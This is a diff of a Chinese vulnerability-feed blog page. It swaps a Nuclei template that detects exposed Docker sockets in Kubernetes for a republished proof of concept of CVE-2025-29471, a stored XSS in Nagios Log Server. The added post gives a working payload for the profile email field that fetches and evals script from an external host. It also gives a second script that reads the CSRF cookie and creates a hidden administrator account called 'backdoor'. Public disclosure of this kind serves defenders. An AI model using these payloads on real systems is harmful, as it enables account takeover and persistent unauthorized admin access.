@@ -19,23 +19,23 @@
   <meta name="author" content="lianccc">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞信息漏洞名称： Kubernetes Exposing Host’s Docker Socket 漏洞类型： 权限提升 漏洞等级： 高危 漏洞描述： 通过卷将主机的Docker套接字暴露给容器。此套接字的所有者是root。给予某人访问权限相当于给予对主机的无限制root访问权限。 产品厂商： Kubernetes 产品名称： Kubernetes 来源： https:&#x2F;&#x2F;github.com&#x2F;">
+    <meta name="description" content="漏洞信息漏洞名称： Nagios Log Server 存储型跨站脚本漏洞（权限提升至管理员） 漏洞编号：  CVE： CVE-2025-29471  漏洞类型： 跨站可执行脚本 漏洞等级： 严重 漏洞描述： Nagios Log Server 2024R1.3.1中存在一个存储型跨站脚本（XSS）漏洞，允许低权限用户在其个人资料的’email’字段中注入恶意JavaScript代码。当管理员查看">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kubernetes Exposing Host&#39;s Docker Socket">
-<meta property="og:url" content="http://example.com/2025/06/11/github_2787999378/index.html">
+<meta property="og:title" content="Nagios Log Server 存储型跨站脚本漏洞（权限提升至管理员）">
+<meta property="og:url" content="http://example.com/2025/06/13/github_4181782913/index.html">
 <meta property="og:site_name" content="liancc&#39; infos blog">
-<meta property="og:description" content="漏洞信息漏洞名称： Kubernetes Exposing Host’s Docker Socket 漏洞类型： 权限提升 漏洞等级： 高危 漏洞描述： 通过卷将主机的Docker套接字暴露给容器。此套接字的所有者是root。给予某人访问权限相当于给予对主机的无限制root访问权限。 产品厂商： Kubernetes 产品名称： Kubernetes 来源： https:&#x2F;&#x2F;github.com&#x2F;">
+<meta property="og:description" content="漏洞信息漏洞名称： Nagios Log Server 存储型跨站脚本漏洞（权限提升至管理员） 漏洞编号：  CVE： CVE-2025-29471  漏洞类型： 跨站可执行脚本 漏洞等级： 严重 漏洞描述： Nagios Log Server 2024R1.3.1中存在一个存储型跨站脚本（XSS）漏洞，允许低权限用户在其个人资料的’email’字段中注入恶意JavaScript代码。当管理员查看">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-06-11T06:49:53.922Z">
-<meta property="article:modified_time" content="2025-06-11T06:49:53.919Z">
+<meta property="article:published_time" content="2025-06-13T02:15:17.743Z">
+<meta property="article:modified_time" content="2025-06-13T02:15:17.740Z">
 <meta property="article:author" content="lianccc">
-<meta property="article:tag" content="projectdiscovery&#x2F;nuclei-templates:github issues">
-<meta property="article:tag" content="权限提升">
+<meta property="article:tag" content="CVE-2025:github search">
+<meta property="article:tag" content="跨站可执行脚本">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>Kubernetes Exposing Host&#39;s Docker Socket - liancc&#39; infos blog</title>
+  <title>Nagios Log Server 存储型跨站脚本漏洞（权限提升至管理员） - liancc&#39; infos blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Kubernetes Exposing Host&#39;s Docker Socket"></span>
+            <span id="subtitle" data-typed-text="Nagios Log Server 存储型跨站脚本漏洞（权限提升至管理员）"></span>
           
         </div>
 
@@ -213,8 +213,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-06-11 06:49" pubdate>
-          2025年6月11日 早上
+        <time datetime="2025-06-13 02:15" pubdate>
+          2025年6月13日 凌晨
         </time>
       </span>
     
@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          330 字
+          470 字
         
       </span>
     
@@ -236,7 +236,7 @@
         
         
         
-          3 分钟
+          4 分钟
         
       </span>
     
@@ -273,21 +273,49 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Kubernetes Exposing Host&#39;s Docker Socket</h1>
+            <h1 id="seo-header">Nagios Log Server 存储型跨站脚本漏洞（权限提升至管理员）</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Kubernetes Exposing Host’s Docker Socket</p>
-<p><strong>漏洞类型：</strong> 权限提升</p>
-<p><strong>漏洞等级：</strong> 高危</p>
-<p><strong>漏洞描述：</strong> 通过卷将主机的Docker套接字暴露给容器。此套接字的所有者是root。给予某人访问权限相当于给予对主机的无限制root访问权限。</p>
-<p><strong>产品厂商：</strong> Kubernetes</p>
-<p><strong>产品名称：</strong> Kubernetes</p>
-<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/c873ea6b2aa6d07a99ef7854663a39965982eebd/cloud%2Fkubernetes%2Fkubernetes-exposing-docker-socket-hostpath.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/c873ea6b2aa6d07a99ef7854663a39965982eebd/cloud%2Fkubernetes%2Fkubernetes-exposing-docker-socket-hostpath.yaml</a></p>
-<p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p>
-<h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> kubernetes-exposing-docker-socket-hostpath<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Kubernetes Exposing Host&#x27;s Docker Socket<br>  <span class="hljs-params">author:</span> dwisiswant0<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> Exposing host&#x27;s Docker socket to containers via a volume.<br>  <span class="hljs-params">impact:</span> |<br>    The owner of this socket is root. Giving someone access to it is equivalent<br>    to giving unrestricted root access to your host.<br>  <span class="hljs-params">remediation:</span> Remove &#x27;docker.sock&#x27; from hostpath to prevent this.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>kubernetes.io<span class="hljs-operator">/</span>docs<span class="hljs-operator">/</span>concepts<span class="hljs-operator">/</span>storage<span class="hljs-operator">/</span>volumes<span class="hljs-operator">/</span><span class="hljs-comment">#hostpath</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>kubernetes.io<span class="hljs-operator">/</span>docs<span class="hljs-operator">/</span>concepts<span class="hljs-operator">/</span>policy<span class="hljs-operator">/</span>pod-security-policy<span class="hljs-operator">/</span><span class="hljs-comment">#volumes-and-file-systems</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>kubernetes.io<span class="hljs-operator">/</span>docs<span class="hljs-operator">/</span>tasks<span class="hljs-operator">/</span>configure-pod-container<span class="hljs-operator">/</span>security-context<span class="hljs-symbol">/</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>cheatsheetseries.owasp.org<span class="hljs-operator">/</span>cheatsheets<span class="hljs-operator">/</span>Docker_Security_Cheat_Sheet.html<span class="hljs-comment">#rule-1-do-not-expose-the-docker-daemon-socket-even-to-the-containers</span><br>  <span class="hljs-params">tags:</span> cloud,devops,kubernetes,k8s<br><br><span class="hljs-params">flow:</span> |<br>  code(<span class="hljs-number">1</span>);<br>  for (<span class="hljs-keyword">let</span> pod of template.items) &#123;<br>    <span class="hljs-attr">pod</span> <span class="hljs-operator">=</span> JSON.parse(pod);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>pod.spec.hasOwnProperty(&#x27;volumes&#x27;)) continue;<br>    for (const volume of pod.spec.volumes) &#123;<br>      <span class="hljs-keyword">if</span> (volume.hasOwnProperty(&#x27;hostPath&#x27;)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>volume.hostPath.hasOwnProperty(&#x27;path&#x27;)) continue;<br>        const path <span class="hljs-operator">=</span> volume.hostPath.path;<br>        <span class="hljs-keyword">if</span> (path <span class="hljs-operator">&amp;&amp;</span> path <span class="hljs-operator">!=</span><span class="hljs-operator">=</span> &#x27;<span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>run<span class="hljs-operator">/</span>docker.sock&#x27;) continue<br>      &#125;<br>      set(&#x27;volume&#x27;, JSON.stringify(volume));<br>      set(&#x27;pod&#x27;, pod.metadata.name);<br>      set(&#x27;namespace&#x27;, pod.metadata.namespace);<br>      code(<span class="hljs-number">2</span>)<br>    &#125;<br>  &#125;<br><br><span class="hljs-params">self-contained:</span> <span class="hljs-literal">true</span><br><span class="hljs-params">code:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">engine:</span><br>      <span class="hljs-operator">-</span> sh<br>      <span class="hljs-operator">-</span> bash<br>    <span class="hljs-params">source:</span> kubectl get pods <span class="hljs-operator">-</span>-all-namespaces <span class="hljs-operator">-</span>-output<span class="hljs-operator">=</span>json<br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> json<br>        <span class="hljs-params">name:</span> items<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">json:</span><br>          <span class="hljs-operator">-</span> &#x27;.items[]&#x27;<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">engine:</span><br>      <span class="hljs-operator">-</span> sh<br>      <span class="hljs-operator">-</span> bash<br>    <span class="hljs-params">source:</span> echo <span class="hljs-operator">-</span>e &#x27;$volume&#x27;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;/var/run/docker.sock&quot;</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;Exposed Docker socket via a volume in the &quot;</span> <span class="hljs-operator">+</span> pod <span class="hljs-operator">+</span> <span class="hljs-string">&quot; pod of &quot;</span> <span class="hljs-operator">+</span> namespace <span class="hljs-operator">+</span> <span class="hljs-string">&quot; namespace&quot;</span>&#x27;<br><span class="hljs-comment"># digest: 490a004630440220118723a85165514f59da64d85df3822f05a47ab5fc3e1e2a01ea0d06cb8d58110220147f70004616c4ee4b84fc2137e253c00a1908207be5e1cfb70b86cb586e0ba3:9e2dfd48464943e7ca3816f5f86e5507</span><br><br></code></pre></td></tr></table></figure>
+                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Nagios Log Server 存储型跨站脚本漏洞（权限提升至管理员）</p>
+<p><strong>漏洞编号：</strong></p>
+<ul>
+<li><strong>CVE：</strong> CVE-2025-29471</li>
+</ul>
+<p><strong>漏洞类型：</strong> 跨站可执行脚本</p>
+<p><strong>漏洞等级：</strong> 严重</p>
+<p><strong>漏洞描述：</strong> Nagios Log Server 2024R1.3.1中存在一个存储型跨站脚本（XSS）漏洞，允许低权限用户在其个人资料的’email’字段中注入恶意JavaScript代码。当管理员查看审计日志时，该脚本会执行，导致通过未经授权的管理员账户创建实现权限提升。在某些配置下，该漏洞可被串联利用以实现远程代码执行（RCE）。</p>
+<p><strong>产品厂商：</strong> Nagios</p>
+<p><strong>产品名称：</strong> Nagios Log Server</p>
+<p><strong>影响版本：</strong> 2024R1.3.1及以下版本</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/skraft9/CVE-2025-29471">https://github.com/skraft9/CVE-2025-29471</a></p>
+<p><strong>类型：</strong> CVE-2025:github search</p>
+<h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul>
+<li>README.md</li>
+</ul>
+<h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="Stored-XSS-Vulnerability-in-Nagios-Log-Server-Privilege-Escalation-to-Admin"><a href="#Stored-XSS-Vulnerability-in-Nagios-Log-Server-Privilege-Escalation-to-Admin" class="headerlink" title="Stored XSS Vulnerability in Nagios Log Server (Privilege Escalation to Admin)"></a>Stored XSS Vulnerability in Nagios Log Server (Privilege Escalation to Admin)</h3><h4 id="Date-2025-04-02"><a href="#Date-2025-04-02" class="headerlink" title="Date: 2025-04-02"></a>Date: 2025-04-02</h4><h4 id="Exploit-Author-Seth-Kraft"><a href="#Exploit-Author-Seth-Kraft" class="headerlink" title="Exploit Author: Seth Kraft"></a>Exploit Author: Seth Kraft</h4><h4 id="Vendor-Homepage-https-www-nagios-com"><a href="#Vendor-Homepage-https-www-nagios-com" class="headerlink" title="Vendor Homepage: https://www.nagios.com/"></a>Vendor Homepage: <a target="_blank" rel="noopener" href="https://www.nagios.com/">https://www.nagios.com/</a></h4><h4 id="Vendor-Changelog-https-www-nagios-com-changelog-log-server"><a href="#Vendor-Changelog-https-www-nagios-com-changelog-log-server" class="headerlink" title="Vendor Changelog: https://www.nagios.com/changelog/#log-server"></a>Vendor Changelog: <a target="_blank" rel="noopener" href="https://www.nagios.com/changelog/#log-server">https://www.nagios.com/changelog/#log-server</a></h4><h4 id="Software-Link-https-www-nagios-com-products-log-server-download"><a href="#Software-Link-https-www-nagios-com-products-log-server-download" class="headerlink" title="Software Link: https://www.nagios.com/products/log-server/download/"></a>Software Link: <a target="_blank" rel="noopener" href="https://www.nagios.com/products/log-server/download/">https://www.nagios.com/products/log-server/download/</a></h4><h4 id="Version-2024R1-3-1-and-below"><a href="#Version-2024R1-3-1-and-below" class="headerlink" title="Version: 2024R1.3.1 and below"></a>Version: 2024R1.3.1 and below</h4><h4 id="Tested-On-Nagios-Log-Server-2024R1-3-1-default-configuration-Ubuntu-20-04"><a href="#Tested-On-Nagios-Log-Server-2024R1-3-1-default-configuration-Ubuntu-20-04" class="headerlink" title="Tested On: Nagios Log Server 2024R1.3.1 (default configuration, Ubuntu 20.04)"></a>Tested On: Nagios Log Server 2024R1.3.1 (default configuration, Ubuntu 20.04)</h4><h4 id="CWE-CWE-79-CWE-352-CWE-285-CWE-269-CWE-602"><a href="#CWE-CWE-79-CWE-352-CWE-285-CWE-269-CWE-602" class="headerlink" title="CWE: CWE-79, CWE-352, CWE-285, CWE-269, CWE-602"></a>CWE: CWE-79, CWE-352, CWE-285, CWE-269, CWE-602</h4><h4 id="CVSS-9-3-CVSS-4-0-AV-N-AC-L-AT-N-PR-L-UI-R-S-C-VC-H-VI-H-VA-H"><a href="#CVSS-9-3-CVSS-4-0-AV-N-AC-L-AT-N-PR-L-UI-R-S-C-VC-H-VI-H-VA-H" class="headerlink" title="CVSS: 9.3 (CVSS:4.0&#x2F;AV:N&#x2F;AC:L&#x2F;AT:N&#x2F;PR:L&#x2F;UI:R&#x2F;S:C&#x2F;VC:H&#x2F;VI:H&#x2F;VA:H)"></a>CVSS: 9.3 (CVSS:4.0&#x2F;AV:N&#x2F;AC:L&#x2F;AT:N&#x2F;PR:L&#x2F;UI:R&#x2F;S:C&#x2F;VC:H&#x2F;VI:H&#x2F;VA:H)</h4><h4 id="Type-Stored-Cross-Site-Scripting-XSS-Privilege-Escalation"><a href="#Type-Stored-Cross-Site-Scripting-XSS-Privilege-Escalation" class="headerlink" title="Type: Stored Cross-Site Scripting (XSS), Privilege Escalation"></a>Type: Stored Cross-Site Scripting (XSS), Privilege Escalation</h4><h4 id="Exploit-Risk-Critical"><a href="#Exploit-Risk-Critical" class="headerlink" title="Exploit Risk: Critical"></a>Exploit Risk: Critical</h4><h3 id="Disclosure"><a href="#Disclosure" class="headerlink" title="Disclosure"></a>Disclosure</h3><p>For research and authorized testing only. Do not use against systems without permission.</p>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h3><p>A stored XSS vulnerability in Nagios Log Server 2024R1.3.1 allows a low-privileged user to inject<br>malicious JavaScript into the ‘email’ field of their profile. When an administrator views the audit logs,<br>the script executes, resulting in privilege escalation via unauthorized admin account creation.<br>The vulnerability can be chained to achieve remote code execution (RCE) in certain configurations.</p>
+<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><ol>
+<li><p>Log in as a standard (non-admin) user.</p>
+</li>
+<li><p>Navigate to the profile update endpoint:</p>
+<p><code>http://&lt;target-ip&gt;/nagioslogserver/profile/update</code></p>
+</li>
+<li><p>Inject the following payload into the email field:</p>
+</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;https://&lt;EXTERNAL-HOST&gt;/xss.js&quot;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>())<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">scriptText</span> =&gt;</span> <span class="hljs-built_in">eval</span>(scriptText))<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 
+<ol start="4">
+<li>Host the xss.js payload on your external server with the following content:</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> csrfTokenMatch = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/csrf_ls=([^;]+)/</span>);<br>  <span class="hljs-keyword">if</span> (!csrfTokenMatch) <span class="hljs-keyword">return</span>;<br>  <span class="hljs-keyword">var</span> csrfToken = <span class="hljs-built_in">encodeURIComponent</span>(csrfTokenMatch[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-keyword">var</span> requestBody = <span class="hljs-string">&quot;csrf_ls=&quot;</span> + csrfToken +<br>    <span class="hljs-string">&quot;&amp;name=backdoor&quot;</span> +<br>    <span class="hljs-string">&quot;&amp;email=hacker@example.com&quot;</span> +<br>    <span class="hljs-string">&quot;&amp;username=backdoor&quot;</span> +<br>    <span class="hljs-string">&quot;&amp;password=Password123!&quot;</span> +<br>    <span class="hljs-string">&quot;&amp;password2=Password123!&quot;</span> +<br>    <span class="hljs-string">&quot;&amp;auth_type=admin&quot;</span> +<br>    <span class="hljs-string">&quot;&amp;apiaccess=1&quot;</span> +<br>    <span class="hljs-string">&quot;&amp;language=en_US&quot;</span> +<br>    <span class="hljs-string">&quot;&amp;account_type=local&quot;</span>;<br><br>  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://&lt;target-ip&gt;/nagioslogserver/admin/users/create&quot;</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>    <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span> &#125;,<br>    <span class="hljs-attr">body</span>: requestBody<br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>())<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span>);<br>&#125;)();<br></code></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>Wait for an administrator to view the audit logs. The JavaScript will execute, creating a new admin account:</li>
+</ol>
+<p>Username: backdoor<br>Password: Password123!</p>
 
                 
               </div>
@@ -321,9 +349,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/projectdiscovery-nuclei-templates-github-issues/" class="print-no-link">#projectdiscovery/nuclei-templates:github issues</a>
+        <a href="/tags/CVE-2025-github-search/" class="print-no-link">#CVE-2025:github search</a>
       
-        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="print-no-link">#权限提升</a>
+        <a href="/tags/%E8%B7%A8%E7%AB%99%E5%8F%AF%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC/" class="print-no-link">#跨站可执行脚本</a>
       
     </div>
   
@@ -335,8 +363,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Kubernetes Exposing Host&#39;s Docker Socket</div>
-      <div>http://example.com/2025/06/11/github_2787999378/</div>
+      <div>Nagios Log Server 存储型跨站脚本漏洞（权限提升至管理员）</div>
+      <div>http://example.com/2025/06/13/github_4181782913/</div>
     </div>
     <div class="license-meta">
       
@@ -348,7 +376,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年6月11日</div>
+          <div>2025年6月13日</div>
         </div>
       
       
@@ -380,9 +408,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/06/11/github_3100720414/" title="敏感文件和配置泄露">
+                      <a href="/2025/06/13/github_2787999378/" title="Kubernetes Exposing Host&#39;s Docker Socket">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">敏感文件和配置泄露</span>
+                        <span class="hidden-mobile">Kubernetes Exposing Host&#39;s Docker Socket</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -390,8 +418,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/06/11/github_3781563168/" title="Zimbra Collaboration Suite 跨站可执行脚本漏洞">
-                        <span class="hidden-mobile">Zimbra Collaboration Suite 跨站可执行脚本漏洞</span>
+                      <a href="/2025/06/13/weixin_2047073814/" title="GitLab 多个漏洞可导致攻击者完全接管账户">
+                        <span class="hidden-mobile">GitLab 多个漏洞可导致攻击者完全接管账户</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
